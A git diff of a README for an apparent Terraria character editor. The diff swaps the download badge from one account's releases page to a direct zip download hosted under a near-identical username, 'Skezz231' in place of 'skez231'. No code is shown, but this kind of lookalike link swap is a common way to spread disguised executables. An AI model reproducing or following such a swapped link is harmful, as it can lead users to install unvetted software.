@@ -1,7 +1,7 @@
 # Terraria Character Editor 1.4.5+ | Calamity & Thorium Full Support
 
 <p align="center">
-  <a href="https://github.com/skez231/Terraria-Character-Editor-1.4.5-Calamity-Thorium/releases/latest">
+  <a href="https://github.com/Skezz231/Terraria-Character-Editor-1.4.5-Calamity-Thorium/releases/download/1.0/Terraria.Inventory.Editor.2026.03.10.zip">
     <img src="https://img.shields.io/badge/Download%20Latest-v1.4.5%20Ready-22c55e?style=for-the-badge&logo=windows&logoColor=white&labelColor=14532d" alt="Download Latest Release">
   </a>
 </p>
@@ -281,6 +281,7 @@ dist/       Distribution-ready files
 ## GitHub release tip
 
 Create a tag like `v1.0.0` and push it to GitHub to generate a release build through the included workflow.
+
 
 
 
